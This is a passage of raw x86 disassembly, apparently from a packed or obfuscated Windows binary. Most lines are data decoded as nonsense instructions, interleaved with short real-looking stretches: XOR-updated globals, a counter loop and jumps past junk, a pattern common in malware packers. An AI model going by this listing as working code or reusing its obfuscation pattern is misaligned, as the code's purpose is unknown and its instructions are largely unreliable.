  40bcd5:	aaa    
  40bcd6:	int    0x17
  40bcd8:	mov    esp,0xd5e0002a
  40bcdd:	aaa    
  40bcde:	sub    dh,BYTE PTR [esi]
  40bce0:	mov    edi,0xa6d12093
  40bce5:	out    0xb2,al
  40bce7:	loop   0x40bc7d
  40bce9:	ins    BYTE PTR es:[edi],dx
  40bcea:	je     0x40bc9d
  40bcec:	or     bh,BYTE PTR [ebx+0x4f2c7672]
  40bcf2:	push   ebx
  40bcf3:	xchg   esp,eax
  40bcf4:	mov    ebp,0xc602728a
  40bcf9:	and    BYTE PTR [ebx+0x48],dh
  40bcfc:	jl     0x40bd3e
  40bcfe:	ins    DWORD PTR es:[edi],dx
  40bcff:	aad    0x17
  40bd01:	fld    TBYTE PTR [eax+0x4f1c57f7]
  40bd07:	mov    DWORD PTR [eax],ecx
  40bd09:	fbld   TBYTE PTR ds:0x9b904da
  40bd0f:	mov    dh,0xb7
  40bd11:	inc    ebp
  40bd12:	or     esp,esi
  40bd14:	jmp    0x1901e35b
  40bd19:	inc    esi
  40bd1a:	cdq    
  40bd1b:	mov    dl,0x18
  40bd1d:	stos   BYTE PTR es:[edi],al
  40bd1e:	in     eax,0x3c
  40bd20:	loope  0x40bda0
  40bd22:	stos   BYTE PTR es:[edi],al
  40bd23:	sub    DWORD PTR [edi-0x6b],edx
  40bd26:	inc    esp
  40bd27:	dec    edi
  40bd28:	sub    dl,ah
  40bd2a:	push   bp
  40bd2c:	push   es
  40bd2d:	pop    ss
  40bd2e:	or     eax,0xe33b2ec
  40bd33:	jbe    0x40bcd1
  40bd35:	sti    
  40bd36:	shl    BYTE PTR [ebx-0x20],1
  40bd39:	cwde   
  40bd3a:	and    DWORD PTR [ebx-0x83a54f2],0x12
  40bd41:	pop    esp
  40bd42:	test   DWORD PTR [edx-0x3f],edi
  40bd45:	push   ebx
  40bd46:	inc    BYTE PTR [edi]
  40bd48:	jecxz  0x40bd9a
  40bd4a:	fnstsw WORD PTR [ecx]
  40bd4c:	cmp    eax,0x4a2d95b0
  40bd51:	add    bl,dh
  40bd53:	out    0x3d,al
  40bd55:	and    al,0x3c
  40bd57:	push   es
  40bd58:	xor    DWORD PTR [ecx-0x1ff74e98],esi
  40bd5e:	cdq    
  40bd5f:	mov    dh,BYTE PTR [ecx]
  40bd61:	xchg   edi,eax
  40bd62:	mov    eax,ds:0x9ec22d11
  40bd67:	outs   dx,DWORD PTR ds:[esi]
  40bd68:	inc    edi
  40bd69:	icebp  
  40bd6a:	xchg   BYTE PTR [edi-0x22efcf2e],bl
  40bd70:	out    0xad,al
  40bd72:	pop    ds
  40bd73:	sbb    eax,0x256926ce
  40bd78:	jae    0x40bdea
  40bd7a:	(bad)  [ebp-0x7a115e25]
  40bd80:	inc    edi
  40bd81:	popa   
  40bd82:	arpl   WORD PTR [ecx],sp
  40bd84:	outs   dx,BYTE PTR ds:[esi]
  40bd85:	jle    0x40be00
  40bd87:	call   0x7032:0xf3db6685
  40bd8e:	push   ecx
  40bd8f:	pop    esi
  40bd90:	rcr    BYTE PTR [ecx+0x41],1
  40bd93:	mov    bh,0x6
  40bd95:	xor    al,0x0
  40bd97:	repz into 
  40bd99:	mov    bh,0xb9
  40bd9b:	dec    esp
  40bd9c:	and    edi,DWORD PTR [eax+0x5294377a]
  40bda2:	call   0x57a0:0x6d63b419
  40bda9:	dec    edi
  40bdaa:	mov    esp,0x2efca198
  40bdaf:	stc    
  40bdb0:	add    edi,ebp
  40bdb2:	inc    edi
  40bdb3:	(bad)  
  40bdb4:	jmp    0xc89b6928
  40bdb9:	push   ds
  40bdba:	fild   QWORD PTR [ebp-0x64]
  40bdbd:	jmp    0x7846:0x3951bfa7
  40bdc4:	shr    DWORD PTR [eax-0x22],cl
  40bdc7:	ds or  al,0x43
  40bdca:	popf   
  40bdcb:	in     al,dx
  40bdcc:	inc    ecx
  40bdcd:	test   al,0xd6
  40bdcf:	sbb    ebx,ecx
  40bdd1:	cdq    
  40bdd2:	inc    edx
  40bdd3:	out    0x69,al
  40bdd5:	jge    0x40bdb1
  40bdd7:	sti    
  40bdd8:	cmp    DWORD PTR [ecx-0x62fc27c4],edx
  40bdde:	jmp    0x2439:0xb6dfbfc0
  40bde5:	push   ss
  40bde6:	dec    edi
  40bde7:	scas   eax,DWORD PTR es:[edi]
  40bde8:	jl     0x40bdc9
  40bdea:	add    eax,DWORD PTR [eax]
  40bdec:	and    esi,ebx
  40bdee:	aam    0x3
  40bdf0:	mov    esi,0xd02b793c
  40bdf5:	or     dh,0x1b
  40bdf8:	inc    esp
  40bdf9:	jmp    0xa714:0x39798bbe
  40be00:	adc    BYTE PTR [ebx-0x38],ch
  40be03:	mov    ds:0x56c70f65,eax
  40be08:	adc    DWORD PTR [ebx+0x4d],ebx
  40be0b:	sbb    al,0x4c
  40be0d:	iretw  
  40be0f:	daa    
  40be10:	add    DWORD PTR ds:0xe2151030,0x6dc7cce8
  40be1a:	adc    bh,BYTE PTR [esi]
  40be1c:	lahf   
  40be1d:	pop    eax
  40be1e:	fcom   QWORD PTR [eax-0x4a]
  40be21:	mov    al,ds:0x1a6d0db5
  40be26:	ficomp WORD PTR [ecx+0x78adb7f6]
  40be2c:	pop    edx
  40be2d:	sub    ah,BYTE PTR [eax+ecx*8-0xa]
  40be31:	and    ah,BYTE PTR [esi]
  40be33:	(bad)  
  40be34:	stc    
  40be35:	jg     0x40be3a
  40be37:	mov    dh,0xd7
  40be39:	stc    
  40be3a:	popa   
  40be3b:	mov    esi,0x75c92da8
  40be40:	aas    
  40be41:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be43:	test   DWORD PTR [ebp+0x2a],ebx
  40be46:	fs out 0xe4,al
  40be49:	dec    edx
  40be4a:	out    0x8a,eax
  40be4c:	add    BYTE PTR [edi+esi*1],al
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     dl,BYTE PTR [edi+0x7bd13e31]
  40befc:	cld    
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	ret    
  40bf04:	sahf   
  40bf05:	ss inc ebp
  40bf07:	dec    eax
  40bf08:	loopne 0x40beff
  40bf0a:	adc    al,0x22
  40bf0c:	adc    bl,bl
  40bf0e:	cli    
  40bf0f:	in     al,dx
  40bf10:	int    0xc0
  40bf12:	sub    DWORD PTR [ecx+eax*8],0xe389b76e
  40bf19:	out    0x8d,eax
  40bf1b:	pusha  
  40bf1c:	push   cs
  40bf1d:	add    ah,BYTE PTR [esi+0x6d282d00]
  40bf23:	dec    esp
  40bf24:	mov    cl,0xee
  40bf26:	or     eax,0x59085950
  40bf2b:	fadd   DWORD PTR [ebp+eax*8+0x4b]
  40bf2f:	fldenv [edx]
  40bf31:	test   eax,0x5ed0ac1b
  40bf36:	ds ja  0x40bec8
  40bf39:	mov    esp,0xc0716bc2
  40bf3e:	cld    
  40bf3f:	and    BYTE PTR [edi],al
  40bf41:	adc    DWORD PTR [eax],0xffffffac
  40bf44:	int    0x24
  40bf46:	push   esi
  40bf47:	mov    ebp,DWORD PTR [eax]
  40bf49:	mov    edi,0x9581c1f2
  40bf4e:	or     DWORD PTR [ecx+eax*2+0x6cc1d2b0],edi
  40bf55:	xor    al,BYTE PTR [ecx]
  40bf57:	push   ebx
  40bf58:	dec    ecx
  40bf59:	jne    0x40bf05
  40bf5b:	int    0xf
  40bf5d:	les    edi,FWORD PTR [eax+ebx*4-0x2a]
  40bf61:	test   al,0x8f
  40bf63:	scas   eax,DWORD PTR es:[edi]
  40bf64:	mov    ds:0xdf16aab7,al
  40bf69:	inc    esi
  40bf6a:	enter  0x4f7a,0xaa
  40bf6e:	xchg   ecx,eax
  40bf6f:	int    0xf4
  40bf71:	(bad)  
  40bf72:	and    dl,dh
  40bf74:	mov    DWORD PTR [edx+0x29c34e9b],esi
  40bf7a:	inc    esi
  40bf7b:	(bad)  
  40bf7c:	repz pop edx
  40bf7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf7f:	sar    DWORD PTR [ecx+0x65ac136d],1
  40bf85:	add    BYTE PTR [eax+0x40],0x7b
  40bf89:	sub    al,0xa1
  40bf8b:	test   eax,0xf95df708
  40bf90:	pop    ecx
  40bf91:	jns    0x40bf55
  40bf93:	and    cl,dl
  40bf95:	neg    eax
  40bf97:	fsub   DWORD PTR [ebx-0x75048eb8]
  40bf9d:	addr16 mov dl,0x69
  40bfa0:	pop    edx
  40bfa1:	push   0x30
  40bfa3:	mov    edx,ss
  40bfa5:	dec    edi
  40bfa6:	retf   
  40bfa7:	add    eax,0x665d39f9
  40bfac:	ins    DWORD PTR es:[edi],dx
  40bfad:	aaa    
  40bfae:	push   0xb08a381b
  40bfb3:	dec    edi
  40bfb4:	xchg   ebp,eax
  40bfb5:	jbe    0x40bfbb
  40bfb7:	data16 jnp 0x40bf43
  40bfba:	icebp  
  40bfbb:	push   es
  40bfbc:	inc    ecx
  40bfbd:	je     0x40bfc7
  40bfbf:	rcr    BYTE PTR [edi+ebx*1-0x1a],1
  40bfc3:	addr16 std 
  40bfc5:	jae    0x40c030
  40bfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc8:	push   ds
  40bfc9:	les    esi,FWORD PTR [edx-0x63cfd1cd]
  40bfcf:	aas    
  40bfd0:	push   edx
  40bfd1:	not    DWORD PTR [edi+0x1d18a267]
  40bfd7:	pop    ds
  40bfd8:	ds mov dl,0x11
  40bfdb:	rol    BYTE PTR [eax+0x30808ec2],cl
  40bfe1:	ins    BYTE PTR es:[edi],dx
  40bfe2:	ins    BYTE PTR es:[edi],dx
  40bfe3:	icebp  
  40bfe4:	cli    
  40bfe5:	out    dx,al
  40bfe6:	push   eax
  40bfe7:	jbe    0x40bfdc
  40bfe9:	push   0x5b
  40bfeb:	mov    bh,0xfc
  40bfed:	push   ebx
  40bfee:	inc    ecx
  40bfef:	aam    0x3f
  40bff1:	mov    bl,0x49
  40bff3:	lahf   
  40bff4:	push   ebx
  40bff5:	and    al,0x34
  40bff7:	aaa    
  40bff8:	or     dl,ah
  40bffa:	cmc    
  40bffb:	inc    edi
  40bffc:	add    bl,BYTE PTR [ecx+ecx*2]
  40bfff:	imul   esp,edx,0x11c2634c
  40c005:	mov    dl,0xd4
  40c007:	mov    ch,BYTE PTR [eax]
  40c009:	mov    ecx,0xea664d97
  40c00e:	adc    bh,BYTE PTR [esi+0x61]
  40c011:	outs   dx,BYTE PTR ds:[esi]
  40c012:	sub    bh,BYTE PTR [ebp+0x2e]
  40c015:	loope  0x40bff7
  40c017:	imul   edx,esi,0xffffffd9
  40c01a:	or     DWORD PTR [esi+ebp*4-0x55],ebp
  40c01e:	and    DWORD PTR [edi],edx
  40c020:	sub    al,0x87
  40c022:	pop    edi
  40c023:	out    0x1,al
  40c025:	jle    0x40c017
  40c027:	ins    DWORD PTR es:[edi],dx
  40c028:	int3   
  40c029:	ins    BYTE PTR es:[edi],dx
  40c02a:	fisttp QWORD PTR [ebx+0x3fc28dd0]
  40c030:	ficomp DWORD PTR [eax]
  40c032:	add    eax,0x97104ef1
  40c037:	cld    
  40c038:	cmp    ebp,esi
  40c03a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c03b:	cmp    BYTE PTR [eax+0x38],bl
  40c03e:	push   esi
  40c03f:	std    
  40c040:	imul   BYTE PTR [ecx+edx*1]
  40c043:	stc    
  40c044:	mov    ecx,0x5a72053e
  40c049:	test   eax,0xa671d268
  40c04e:	loop   0x40c07f
  40c050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c051:	call   FWORD PTR [ebp+0x1afc3673]
  40c057:	sbb    bh,ah
  40c059:	stos   DWORD PTR es:[edi],eax
  40c05a:	adc    DWORD PTR [esi],0xd5593ab1
  40c060:	addr16 cmp dl,bl
  40c063:	fistp  QWORD PTR [eax+0x42101e81]
  40c069:	push   edx
  40c06a:	xchg   ebx,eax
  40c06b:	sbb    cl,BYTE PTR ds:0x3d1b406c
  40c071:	cmp    ecx,0x45d5864a
  40c077:	and    esp,DWORD PTR [ecx]
  40c079:	mov    dl,BYTE PTR ds:0x1b687691
  40c07f:	dec    esp
  40c080:	js     0x40c0b5
  40c082:	cvtdq2ps xmm6,xmm5
  40c085:	addr16 mov al,0x92
  40c088:	out    dx,al
  40c089:	js     0x40c0b1
  40c08b:	pop    eax
  40c08c:	out    dx,eax
  40c08d:	or     esi,DWORD PTR [ebx-0x25]
  40c090:	not    DWORD PTR [ecx+0x50577a35]
  40c096:	adc    al,0xc1
  40c098:	(bad)  [edi]
  40c09a:	jmp    0x40c025
  40c09c:	inc    ebx
  40c09d:	mov    ds,WORD PTR ds:0x6d6a6bd7
  40c0a3:	scas   eax,DWORD PTR es:[edi]
  40c0a4:	pop    eax
  40c0a5:	inc    edi
  40c0a6:	in     al,0xde
  40c0a8:	fld    QWORD PTR ds:0x4368d453
  40c0ae:	cmp    al,0x8d
  40c0b0:	ds and eax,0x7d3aeaf6
  40c0b6:	fs test eax,0xc2007216
  40c0bc:	xchg   esp,eax
  40c0bd:	xor    eax,0x2d808a55
  40c0c2:	cli    
  40c0c3:	adc    cl,ah
  40c0c5:	inc    ebx
  40c0c6:	fcmovnbe st,st(6)
  40c0c8:	mov    ebx,0xbcfd3a8a
  40c0cd:	mov    al,BYTE PTR [edx+0x52458884]
  40c0d3:	(bad)  
  40c0d4:	ins    DWORD PTR es:[edi],dx
  40c0d5:	loopne 0x40c0a9
  40c0d7:	xchg   ebx,eax
  40c0d8:	xchg   BYTE PTR [ebx-0x6554f041],al
  40c0de:	adc    cl,0xbe
  40c0e1:	xor    al,0x31
  40c0e3:	xor    al,0x72
  40c0e5:	loop   0x40c0ed
  40c0e7:	mov    eax,ds:0xc7b5286b
  40c0ec:	adc    DWORD PTR [edx-0x52504235],edi
  40c0f2:	pop    ds
  40c0f3:	mov    edi,0xda5584f
  40c0f8:	mov    ebp,0x6a50c8af
  40c0fd:	mov    edx,0x8bba675c
  40c102:	jne    0x40c10c
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1-0x7109ac4b],si
  40c11e:	(bad)  
  40c11f:	cmp    al,0x7d
  40c121:	cli    
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	or     eax,DWORD PTR [edi]
  40c12a:	(bad)  
  40c12b:	call   0x905cc324
  40c130:	push   ebx
  40c131:	or     ch,bh
  40c133:	in     eax,0x55
  40c135:	arpl   WORD PTR [eax],cx
  40c137:	push   ebp
  40c138:	or     dl,BYTE PTR [ebx-0x4b]
  40c13b:	test   DWORD PTR [edx+0x3db5f3ad],ebp
  40c141:	xor    ebp,ebp
  40c143:	ds and eax,0x2465c4d4
  40c149:	scas   al,BYTE PTR es:[edi]
  40c14a:	ss dec esp
  40c14c:	jmp    0x40c13e
  40c14e:	inc    eax
  40c14f:	inc    ebx
  40c150:	cld    
  40c151:	inc    esp
  40c152:	dec    ebp
  40c153:	push   ebx
  40c154:	push   ebp
  40c155:	adc    al,0x71
  40c157:	pop    DWORD PTR [ebp-0x1d]
  40c15a:	cld    
  40c15b:	sub    al,0x97
  40c15d:	std    
  40c15e:	dec    edi
  40c15f:	fs mov esi,0x828bcf29
  40c165:	ins    BYTE PTR es:[edi],dx
  40c166:	sub    DWORD PTR [esi-0x6ffff63b],ebp
  40c16c:	lock (bad) 
  40c16e:	sbb    ecx,DWORD PTR [ebx+0x62]
  40c171:	test   eax,0x7ae4a6bf
  40c176:	sahf   
  40c177:	push   0xe4ed2a1a
  40c17c:	jbe    0x40c190
  40c17e:	mov    BYTE PTR [ecx+0x49dd1042],dh
  40c184:	mov    es:0xbd898cb3,al
  40c18a:	xchg   ecx,eax
  40c18b:	je     0x40c125
  40c18d:	push   es
  40c18e:	in     eax,dx
  40c18f:	(bad)  
  40c190:	push   eax
  40c191:	imul   esi,DWORD PTR [ebx+0x49eac001],0xffffffb2
  40c198:	jecxz  0x40c145
  40c19a:	punpckhbw mm5,QWORD PTR [eax+0x36]
  40c19e:	and    BYTE PTR [ecx+0x7475920a],bl
  40c1a4:	dec    ebp
  40c1a5:	daa    
  40c1a6:	jmp    0xb2645996
  40c1ab:	or     esi,DWORD PTR [edi-0x4f]
  40c1ae:	jle    0x40c17c
  40c1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1b1:	mov    ebp,0xf272cc09
  40c1b6:	sbb    eax,DWORD PTR [esi+0x11d35813]
  40c1bc:	fwait
  40c1bd:	shr    BYTE PTR [esi],0x4d
  40c1c0:	(bad)  
  40c1c1:	jmp    0x77461bb7
  40c1c6:	mov    al,BYTE PTR [eax+0x3e]
  40c1c9:	mov    bl,bh
  40c1cb:	mov    BYTE PTR [eax+0xe592beb],0x9d
  40c1d2:	adc    bh,BYTE PTR ds:0x7bc36a2f
  40c1d8:	add    BYTE PTR [edx+0x2de0a6d8],0x6b
  40c1df:	mov    BYTE PTR [ebp+0x69],bl
  40c1e2:	sti    
  40c1e3:	cmp    ebx,DWORD PTR [esi+0x17a3939]
  40c1e9:	sub    edx,ebx
  40c1eb:	fisttp WORD PTR ds:0xf2ece614
  40c1f1:	mov    al,0x91
  40c1f3:	mov    ecx,DWORD PTR [edx]
  40c1f5:	out    dx,al
  40c1f6:	div    BYTE PTR [eax+0x7b]
  40c1f9:	dec    edi
  40c1fa:	push   esi
  40c1fb:	xchg   esp,eax
  40c1fc:	fld    DWORD PTR [ecx+edx*8-0x6a]
  40c200:	jge    0x40c264
  40c202:	dec    eax
  40c203:	xor    ebx,DWORD PTR [ebp-0x4a95aef2]
  40c209:	jp     0x40c1c0
  40c20b:	push   ss
  40c20c:	sbb    eax,0x566ac02b
  40c211:	ins    DWORD PTR es:[edi],dx
  40c212:	in     eax,0x64
  40c214:	out    dx,al
  40c215:	and    DWORD PTR [ecx-0x30cd1999],esi
  40c21b:	clc    
  40c21c:	dec    edx
  40c21d:	pop    edi
  40c21e:	hlt    
  40c21f:	xchg   edi,eax
  40c220:	js     0x40c1c9
  40c222:	loop   0x40c1d1
  40c224:	and    esi,DWORD PTR [esi-0x7c]
  40c227:	retf   0xdce6
  40c22a:	leave  
  40c22b:	retf   
  40c22c:	fwait
  40c22d:	mov    ebx,0xbc330315
  40c232:	dec    edi
  40c233:	in     al,dx
  40c234:	loope  0x40c1fd
  40c236:	pushf  
  40c237:	cmp    dh,BYTE PTR [edi]
  40c239:	ins    BYTE PTR es:[edi],dx
  40c23a:	push   es
  40c23b:	cmp    BYTE PTR [ecx+0x1b3c693e],dl
  40c241:	hlt    
  40c242:	push   ss
  40c243:	leave  
  40c244:	jo     0x40c224
  40c246:	cmp    esp,edx
  40c248:	inc    esp
  40c249:	inc    esi
  40c24a:	addr16 xchg ecx,eax
  40c24c:	test   eax,0x98da258e
  40c251:	stc    
  40c252:	add    ch,BYTE PTR [ebx+0x3f]
  40c255:	pop    ss
  40c256:	fdivr  DWORD PTR [ecx+edi*2+0x79]
  40c25a:	or     al,0xe5
  40c25c:	out    0x69,eax
  40c25e:	push   ds
  40c25f:	call   0xdb1feeb5
  40c264:	xor    cl,ch
  40c266:	(bad)  
  40c267:	loop   0x40c212
  40c269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c26a:	enter  0x3575,0x8
  40c26e:	stos   BYTE PTR es:[edi],al
  40c26f:	inc    ebx
  40c270:	fs push es
  40c272:	lock jae 0x40c25d
  40c275:	add    al,0xa3
  40c277:	add    BYTE PTR [edx],al
  40c279:	cld    
  40c27a:	pop    edi
  40c27b:	ret    0x7c78
  40c27e:	bound  eax,QWORD PTR [ecx]
  40c280:	adc    DWORD PTR [edi],eax
  40c282:	push   cs
  40c283:	mov    al,ds:0xdf4981c4
  40c288:	sub    dh,BYTE PTR [edx]
  40c28a:	or     DWORD PTR [edx-0x54],edx
  40c28d:	push   cs
  40c28e:	add    al,0x1
  40c290:	popa   
  40c291:	icebp  
  40c292:	xchg   ebx,eax
  40c293:	mov    edi,0x7f360fd0
  40c298:	lea    edi,[ecx+0x6880128e]
  40c29e:	ret    0xe7ca
  40c2a1:	push   ecx
  40c2a2:	mov    ds:0x1fb6cb5c,eax
  40c2a7:	sub    BYTE PTR [edi],al
  40c2a9:	out    0xbf,al
  40c2ab:	repnz dec eax
  40c2ad:	sbb    BYTE PTR [esi-0x7051520a],dh
  40c2b3:	popf   
  40c2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b5:	loopne 0x40c28b
  40c2b7:	lds    edi,FWORD PTR [bx+si]
  40c2ba:	add    al,0x39
  40c2bc:	cdq    
  40c2bd:	inc    esi
  40c2be:	push   ss
  40c2bf:	sbb    al,al
  40c2c1:	fld    QWORD PTR [esi-0x7feb5e1b]
  40c2c7:	or     BYTE PTR [ebx+edi*2],bl
  40c2ca:	fcmovne st,st(3)
  40c2cc:	cwde   
  40c2cd:	lea    esi,[edi-0xb4301b9]
  40c2d3:	cmp    BYTE PTR [ecx+edi*8-0x7332baa0],bl
  40c2da:	xchg   esp,eax
  40c2db:	call   0x5c03:0xab487467
  40c2e2:	jmp    edx
  40c2e4:	and    ecx,0x401609bd
  40c2ea:	and    eax,0x3f935417
  40c2ef:	mov    ebx,0x96713b31
  40c2f4:	in     al,dx
  40c2f5:	push   ss
  40c2f6:	mov    BYTE PTR [ebp+0x54],0x3f
  40c2fa:	aam    0xb5
  40c2fc:	pop    ds
  40c2fd:	dec    edx
  40c2fe:	push   DWORD PTR [edi]
  40c300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c301:	dec    edx
  40c302:	into   
  40c303:	cld    
  40c304:	das    
  40c305:	mov    dl,0xa0
  40c307:	cli    
  40c308:	inc    ecx
  40c309:	jae    0x40c32e
  40c30b:	clc    
  40c30c:	xchg   ebp,eax
  40c30d:	mov    edi,0xd0e10db0
  40c312:	call   0xeb02b0f8
  40c317:	jnp    0x40c36d
  40c319:	jle    0x40c2b3
  40c31b:	pop    ds
  40c31c:	xchg   esp,eax
  40c31d:	xor    ch,bl
  40c31f:	shl    BYTE PTR [eax+0xe],1
  40c322:	or     BYTE PTR [ebp+0x4639966c],ah
  40c328:	push   esp
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c31c
  40c359:	imul   eax,esp,0x7
  40c35c:	jg     0x40c356
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	inc    esi
  40c365:	jno    0x40c3c2
  40c367:	ja     0x40c3e2
  40c369:	stos   BYTE PTR es:[edi],al
  40c36a:	fisubr DWORD PTR [ebp+0x32e1fbe8]
  40c370:	std    
  40c371:	ins    BYTE PTR es:[edi],dx
  40c372:	(bad)  [ebx-0x78]
  40c375:	cmp    DWORD PTR [ebp+0x6d],esp
  40c378:	loop   0x40c391
  40c37a:	push   ss
  40c37b:	mov    cl,0x11
  40c37d:	inc    esi
  40c37e:	xchg   BYTE PTR [edi-0x46],cl
  40c381:	les    edi,FWORD PTR ds:0xbdb3fbdf
  40c387:	mov    ecx,0xa9228b3e
  40c38c:	aas    
  40c38d:	mov    ah,0x37
  40c38f:	push   edi
  40c390:	push   eax
  40c391:	in     al,dx
  40c392:	imul   edx,DWORD PTR [eax-0x7e],0xffffff8f
  40c396:	mov    ds:0xfa5bfe04,al
  40c39b:	(bad)  
  40c39c:	adc    al,0xd7
  40c39e:	add    al,0xfb
  40c3a0:	dec    ebx
  40c3a1:	ins    BYTE PTR es:[edi],dx
  40c3a2:	jns    0x40c34c
  40c3a4:	pop    ss
  40c3a5:	inc    edi
  40c3a6:	mov    ds:0xb7695103,al
  40c3ab:	jmp    0x5b3540e6
  40c3b0:	xchg   BYTE PTR [ebp+0x144efc8e],cl
  40c3b6:	test   BYTE PTR [ecx+esi*2-0xd],bl
  40c3ba:	adc    DWORD PTR [edi+0x7],ebp
  40c3bd:	ins    BYTE PTR es:[edi],dx
  40c3be:	sbb    dl,BYTE PTR [esi+eax*4-0x74]
  40c3c2:	jb     0x40c39c
  40c3c4:	xchg   ebx,eax
  40c3c5:	dec    ebx
  40c3c6:	pop    ebx
  40c3c7:	fcomp  DWORD PTR [edx-0x1a26a0d3]
  40c3cd:	xor    dl,ah
  40c3cf:	xchg   edx,eax
  40c3d0:	pop    eax
  40c3d1:	and    ah,BYTE PTR [ecx-0x25849825]
  40c3d7:	dec    ecx
  40c3d8:	sti    
  40c3d9:	inc    esi
  40c3da:	cli    
  40c3db:	sub    dl,bh
  40c3dd:	sbb    DWORD PTR [ebx-0x2a8c91ba],0xfc9921a
  40c3e7:	push   cs
  40c3e8:	je     0x40c40d
  40c3ea:	dec    edx
  40c3eb:	fs (bad) 
  40c3ee:	dec    eax
  40c3ef:	fild   DWORD PTR [ebx+0x3]
  40c3f2:	retf   0x2d24
  40c3f5:	xor    al,0x35
  40c3f7:	jge    0x40c395
  40c3f9:	sti    
  40c3fa:	push   ds
  40c3fb:	sub    dl,BYTE PTR ds:[esi]
  40c3fe:	or     cl,BYTE PTR [eax]
  40c400:	in     eax,0x29
  40c402:	jo     0x40c436
  40c404:	sub    eax,0x257f9c83
  40c409:	(bad)  
  40c40a:	adc    al,0x61
  40c40c:	jle    0x40c397
  40c40e:	and    DWORD PTR [ebx],edi
  40c410:	int3   
  40c411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c412:	leave  
  40c413:	jnp    0x40c3b1
  40c415:	or     edx,DWORD PTR [eax+eax*1-0x4853b5dd]
  40c41c:	push   ebx
  40c41d:	les    edi,FWORD PTR [edx+ebx*1+0x1e]
  40c421:	mov    gs,WORD PTR [edi]
  40c423:	dec    eax
  40c424:	pusha  
  40c425:	jo     0x40c413
  40c427:	into   
  40c428:	and    al,0x17
  40c42a:	and    ebp,DWORD PTR [eax-0x769aa18d]
  40c430:	popf   
  40c431:	push   ebx
  40c432:	add    edx,ebx
  40c434:	xor    dl,BYTE PTR [ebx-0x3c]
  40c437:	sahf   
  40c438:	push   eax
  40c439:	gs pop esi
  40c43b:	test   eax,0xd5e039c9
  40c440:	jge    0x40c4a6
  40c442:	push   edx
  40c443:	(bad)  
  40c444:	dec    ebp
  40c445:	xor    ebp,DWORD PTR [edi]
  40c447:	imul   ebp,DWORD PTR [esi-0x40],0xffffff92
  40c44b:	or     DWORD PTR [edx],ecx
  40c44d:	pop    ecx
  40c44e:	aas    
  40c44f:	loopne 0x40c3d2
  40c451:	mov    bl,0xae
  40c453:	std    
  40c454:	pop    ds
  40c455:	mov    cl,0x62
  40c457:	push   ds
  40c458:	sub    BYTE PTR [edx+0x48],0x63
  40c45c:	cmp    esi,ecx
  40c45e:	or     dh,al
  40c460:	xchg   ebp,eax
  40c461:	iret   
  40c462:	fucomi st,st(1)
  40c464:	pop    ecx
  40c465:	jg     0x40c40d
  40c467:	and    edi,edx
  40c469:	xchg   ebp,eax
  40c46a:	jmp    FWORD PTR [ebx+edi*4+0x37]
  40c46e:	xchg   ecx,eax
  40c46f:	mov    ebx,0xa25f260
  40c474:	int3   
  40c475:	cwde   
  40c476:	in     eax,dx
  40c477:	xor    esp,DWORD PTR [ecx]
  40c479:	add    ecx,esi
  40c47b:	ret    
  40c47c:	push   ecx
  40c47d:	jmp    0x732c:0x9fbe9fa0
  40c484:	and    al,bl
